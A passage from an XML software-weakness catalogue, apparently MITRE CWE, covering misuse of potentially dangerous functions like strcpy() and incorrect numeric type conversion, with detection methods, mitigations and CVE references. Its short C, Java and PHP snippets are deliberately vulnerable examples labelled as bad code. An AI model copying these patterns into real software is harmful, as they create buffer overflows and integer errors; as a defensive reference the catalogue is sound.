         <Relationship_Notes>
            <Relationship_Note>
               <Text>This weakness is different than CWE-242 (Use of Inherently Dangerous
						Function). CWE-242 covers functions with such significant security problems
						that they can never be guaranteed to be safe. Some functions, if used
						properly, do not directly pose a security risk, but can introduce a weakness
						if not called correctly. These are regarded as potentially dangerous. A
						well-known example is the strcpy() function. When provided with a
						destination buffer that is larger than its source, strcpy() will not
						overflow. However, it is so often misused that some developers prohibit
						strcpy() entirely.</Text>
            </Relationship_Note>
         </Relationship_Notes>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Languages>
               <Language Language_Name="C"/>
               <Language Language_Name="C++"/>
            </Languages>
         </Applicable_Platforms>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Other</Consequence_Scope>
               <Consequence_Technical_Impact>Varies by context</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Quality degradation</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Unexpected state</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the function is used incorrectly, then it could result in security
							problems.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode Quality Analysis</Text>
                        <Text>Binary / Bytecode simple extractor – strings, ELF readers,
									etc.</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Debugger</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Monitored Virtual Environment - run potentially malicious code
									in sandbox / wrapper / virtual machine, see if it does anything
									suspicious</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Warning Flags</Text>
                        <Text>Source Code Quality Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Origin Analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Formal Methods / Correct-By-Construction</Text>
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Build and Compilation</Mitigation_Phase>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Identify a list of prohibited API functions and prohibit developers
							from using these functions, providing safer alternatives. In some cases,
							automatic code analysis tools or the compiler can be instructed to spot
							use of prohibited functions, such as the "banned.h" include file from
							Microsoft's SDL. [R.676.1] [R.676.2]</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Causal_Nature>Explicit</Causal_Nature>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-6">
               <Intro_Text>The following code attempts to create a local copy of a buffer to
						perform some manipulations to the data.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>void manipulate_string(char * string){</Code>
                     <Block>
                        <Code>char buf[24];</Code>
                        <Code>strcpy(buf, string);</Code>
                        <Code>...</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>However, the programmer does not ensure that the size of the data
							pointed to by string will fit in the local buffer and blindly copies the
							data with the potentially dangerous strcpy() function. This may result
							in a buffer overflow condition if an attacker can influence the contents
							of the string parameter.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-1470</Observed_Example_Reference>
               <Observed_Example_Description>Library has multiple buffer overflows using
						sprintf() and strcpy()</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3849</Observed_Example_Reference>
               <Observed_Example_Description>Buffer overflow using
						strcat()</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2006-2114</Observed_Example_Reference>
               <Observed_Example_Description>Buffer overflow using
						strcpy()</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2006-0963</Observed_Example_Reference>
               <Observed_Example_Description>Buffer overflow using
						strcpy()</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2011-0712</Observed_Example_Reference>
               <Observed_Example_Description>Vulnerable use of strcpy() changed to use safer
						strlcpy()</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-5005</Observed_Example_Reference>
               <Observed_Example_Description>Buffer overflow using
						strcpy()</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Local_Reference_ID="R.676.1">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Title>Security Development Lifecycle (SDL) Banned Function
						Calls</Reference_Title>
               <Reference_Link>http://msdn.microsoft.com/en-us/library/bb288454.aspx</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.676.2">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 5, "Safe String Handling" Page 156,
						160</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.676.3">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 8, "C String Handling", Page 388.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="7 Pernicious Kingdoms">
               <Mapped_Node_Name>Dangerous Functions</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Prefer functions that support error checking over equivalent
						functions that don't</Mapped_Node_Name>
               <Mapped_Node_ID>ERR07-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Be careful using functions that use file names for
						identification</Mapped_Node_Name>
               <Mapped_Node_ID>FIO01-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Use strtol() or a related function to convert a string token
						to an integer</Mapped_Node_Name>
               <Mapped_Node_ID>INT06-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Use strtol() or a related function to convert a string token
						to an integer</Mapped_Node_Name>
               <Mapped_Node_ID>INT06-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Be careful using functions that use file names for
						identification</Mapped_Node_Name>
               <Mapped_Node_ID>FIO01-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Use of an improper API</Mapped_Node_Name>
               <Mapped_Node_ID>SFP3</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>113</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>7 Pernicious Kingdoms</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Sean Eidemiller</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative
						examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relationships, Other_Notes,
						Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Other_Notes, References,
						Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Observed_Examples,
						Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns,
						Relationships, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
                    <Weakness ID="681" Name="Incorrect Conversion between Numeric Types" Weakness_Abstraction="Base" Status="Draft">
         <Description>
            <Description_Summary>When converting from one data type to another, such as long to
					integer, data can be omitted or translated in a way that produces unexpected
					values. If the resulting values are used in a sensitive context, then dangerous
					behaviors may occur.</Description_Summary>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>808</Relationship_Target_ID>
               <!--2010 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>704</Relationship_Target_ID>
               <!--Incorrect Type Conversion or Cast--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanPrecede</Relationship_Nature>
               <Relationship_Target_ID>682</Relationship_Target_ID>
               <!--Incorrect Calculation--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>189</Relationship_Target_ID>
               <!--Numeric Errors--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>136</Relationship_Target_ID>
               <!--Type Errors--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>738</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 04 - Integers (INT)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>739</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 05 - Floating Point (FLP)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>848</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 03 - Numeric Types and Operations (NUM)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>872</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 04 - Integers (INT)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>873</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 05 - Floating Point Arithmetic (FLP)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>998</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Glitch in Computation--></Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Time_of_Introduction>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium to High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Other</Consequence_Scope>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Technical_Impact>Unexpected state</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Quality degradation</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>The program could wind up using the wrong number and generate
							incorrect results. If the number is used to allocate resources or make a
							security decision, then this could introduce a vulnerability.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Avoid making conversion between numeric types. Always check for the
							allowed ranges.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following Java example, a float literal is cast to an
						integer, thus causing a loss of precision.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>int i = (int) 33457.8f;</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code adds a float and an integer together, casting the result
						to an integer.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code> $floatVal = 1.8345;</Code>
                     <Code> $intVal = 3;</Code>
                     <Code>$result = (int)$floatVal + $intVal;</Code>
                  </Block>
                  <Text>Normally, PHP will preserve the precision of this operation, making
							$result = 4.8345. After the cast to int, it is reasonable to expect PHP
							to follow rounding convention and set $result = 5. However, the explicit
							cast to int always rounds DOWN, so the final value of $result is 4. This
							behavior may have unintended consequences.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-73">
               <Intro_Text>In this example the variable amount can hold a negative value when
						it is returned. Because the function is declared to return an unsigned int,
						amount will be implicitly converted to unsigned.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>unsigned int readdata () {</Code>
                     <Block>
                        <Code>int amount = 0;</Code>
                        <Code>...</Code>
                        <Code>if (result == ERROR)</Code>
                        <Code>amount = -1;</Code>
                        <Code>...</Code>
                        <Code>return amount;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>If the error condition in the code above is met, then the return value
							of readdata() will be 4,294,967,295 on a system that uses 32-bit
							integers. </Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-74">
               <Intro_Text>In this example, depending on the return value of
						accecssmainframe(), the variable amount can hold a negative value when it is
						returned. Because the function is declared to return an unsigned value,
						amount will be implicitly cast to an unsigned number.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>unsigned int readdata () {</Code>
                     <Block>
                        <Code>int amount = 0;</Code>
                        <Code>...</Code>
                        <Code>amount = accessmainframe();</Code>
                        <Code>...</Code>
                        <Code>return amount;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>If the return value of accessmainframe() is -1, then the return value
							of readdata() will be 4,294,967,295 on a system that uses 32-bit
							integers.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-4268</Observed_Example_Reference>
               <Observed_Example_Description>Chain: integer signedness passes signed
						comparison, leads to heap overflow</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-4988</Observed_Example_Reference>
               <Observed_Example_Description>Chain: signed short width value in image processor
						is sign extended during conversion to unsigned int, which leads to integer
						overflow and heap-based buffer overflow.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-0231</Observed_Example_Reference>
               <Observed_Example_Description> Integer truncation of length value leads to
						heap-based buffer overflow.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-3282</Observed_Example_Reference>
               <Observed_Example_Description>Size of a particular type changes for 64-bit
						platforms, leading to an integer truncation in document processor causes
						incorrect index to be generated.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Reference_ID="REF-7">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 6, "Type Conversions", Page 223.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Convert integers to floating point for floating point
						operations</Mapped_Node_Name>
               <Mapped_Node_ID>FLP33-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Ensure that floating point conversions are within range of the
						new type</Mapped_Node_Name>
               <Mapped_Node_ID>FLP34-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Use intmax_t or uintmax_t for formatted IO on
						programmer-defined integer types</Mapped_Node_Name>
               <Mapped_Node_ID>INT15-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Ensure that integer conversions do not result in lost or
						misinterpreted data</Mapped_Node_Name>
               <Mapped_Node_ID>INT31-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Evaluate integer expressions in a larger size before comparing
						or assigning to that size</Mapped_Node_Name>
               <Mapped_Node_ID>INT35-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Ensure conversions of numeric types to narrower types do not
						result in lost or misinterpreted data</Mapped_Node_Name>
               <Mapped_Node_ID>NUM12-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Use intmax_t or uintmax_t for formatted IO on
						programmer-defined integer types</Mapped_Node_Name>
               <Mapped_Node_ID>INT15-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Ensure that integer conversions do not result in lost or
						misinterpreted data</Mapped_Node_Name>
               <Mapped_Node_ID>INT31-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Evaluate integer expressions in a larger size before comparing
						or assigning to that size</Mapped_Node_Name>
               <Mapped_Node_ID>INT35-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Convert integers to floating point for floating point
						operations</Mapped_Node_Name>
               <Mapped_Node_ID>FLP33-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Ensure that floating point conversions are within range of the
						new type</Mapped_Node_Name>
               <Mapped_Node_ID>FLP34-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Glitch in computation</Mapped_Node_Name>
               <Mapped_Node_ID>SFP1</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Modification Modification_Source="External">
               <Modifier>Sean Eidemiller</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative
						examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Description, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Likelihood_of_Exploit,
						Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
